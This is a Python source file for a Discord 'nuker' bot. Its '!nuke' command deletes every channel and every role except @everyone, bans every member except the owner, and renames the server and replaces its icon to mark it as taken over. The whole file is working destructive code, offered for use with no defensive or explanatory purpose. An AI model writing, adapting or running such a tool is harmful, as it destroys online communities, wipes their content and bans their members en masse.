import discord
from discord.ext import commands

from src import utils, constants

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
    utils.log(f"Logged in as {bot.user.name}")
    utils.log('Write command "!nuke" in the chat when you ready')


@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    guild = ctx.guild

    for channel in guild.channels:
        try:
            await channel.delete()
            utils.log(f"Deleted channel: {channel.name}")
        except discord.Forbidden:
            utils.log(f"Permission error when deleting channel {channel.name}.")
        except discord.HTTPException as err:
            utils.log(f"HTTP exception when deleting channel {channel.name}: {err}")

    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                utils.log(f"Deleted role: {role.name}")
            except discord.Forbidden:
                utils.log(f"Permission error when deleting role {role.name}.")
            except discord.HTTPException as err:
                utils.log(f"HTTP exception when deleting role {role.name}: {err}")

    for member in guild.members:
        if member != guild.owner:
            try:
                await member.ban(reason=f"Nuked by {constants.name}")
                utils.log(f"Banned member: {member.name}")
            except discord.Forbidden:
                utils.log(f"Permission error when banning member {member.name}.")
            except discord.HTTPException as err:
                utils.log(f"HTTP exception when banning member {member.name}: {err}")

    try:
        await guild.edit(name=constants.name)
        utils.log(f"Server name changed to {constants.name}")
    except discord.Forbidden:
        utils.log("Permission error when changing the server name.")
    except discord.HTTPException as err:
        utils.log(f"HTTP exception when changing server name: {err}")

    try:
        icon_bytes = await utils.fetch_image_bytes(constants.ICON_URL)
        await guild.edit(icon=icon_bytes)
        utils.log("Server icon updated.")
    except discord.Forbidden:
        utils.log("Permission error when changing the server icon.")
    except discord.HTTPException as err:
        utils.log(f"HTTP exception when changing server icon: {err}")
